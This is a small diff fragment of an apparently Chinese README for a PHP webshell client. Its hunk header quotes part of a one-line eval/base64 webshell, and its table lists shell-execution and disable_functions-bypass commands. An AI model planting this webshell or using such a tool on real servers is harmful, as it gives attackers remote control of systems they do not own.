@@ -79,7 +79,7 @@ if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'
 | **mkdir**, **mkd**, **md** | 创建目录 |
 | **create**, **mkf** | 创建空文件 |
 | **touch**, **stat** | 更新时间/创建空文件；文件/目录信息 |
-| **edit**   | 下载 → 本地编辑 → 上传 |
+| **edit**   | 下载 -> 本地编辑 -> 上传 |
 | **run**    | Shell 模式（exec/shell_exec/…）- 输入 `exit` 退出 |
 | **exploit** | 绕过 disable_functions（如 7.3–8.1） |
 | **scan**   | 递归扫描，报告在 report/ |
